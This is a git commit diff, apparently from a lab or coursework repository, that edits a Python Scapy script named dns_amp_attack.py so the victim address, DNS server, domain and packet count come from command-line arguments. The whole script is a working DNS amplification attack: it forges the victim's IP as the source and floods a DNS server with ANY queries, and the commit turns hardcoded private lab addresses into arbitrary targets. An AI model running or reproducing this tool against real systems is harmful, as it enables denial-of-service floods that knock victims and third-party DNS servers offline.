148c14d551e2ccc2c3a9cd4304b73c53834c8513
Natalia Brochocka <nkzb33@gmail.com>
2021-10-29 12:08:10 +0200

    Add possibility to run python dns amp script with args

--- python_scripts/dns_amp_attack.py
+++ python_scripts/dns_amp_attack.py
@@ -1,17 +1,18 @@
 #!/usr/bin/env python3
 
 from scapy.all import *
+import sys
 
-# TODO: handle command-line arguments passed to the script (sys.argv)
-# python3 dns_amp_attack.py <target_addr> <dns_server_addr> <domain> <number_of_packets>
+# python3 dns_amp_attack.py <victim_addr> <dns_server_addr> <domain> <number_of_packets>
 
-victim_addr = '192.168.27.11'
-dns_server_addr = '192.168.27.9'
-domain = 'ddos.edu'
+victim_addr = sys.argv[1]
+dns_server_addr = sys.argv[2]
+domain = sys.argv[3]
+number_of_packets = sys.argv[4]
 
 ip = IP(src=victim_addr, dst=dns_server_addr)
 udp = UDP(dport=53)
 dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))
 
 request = (ip/udp/dns)
-send(request, count=100)
+send(request, count=number_of_packets)
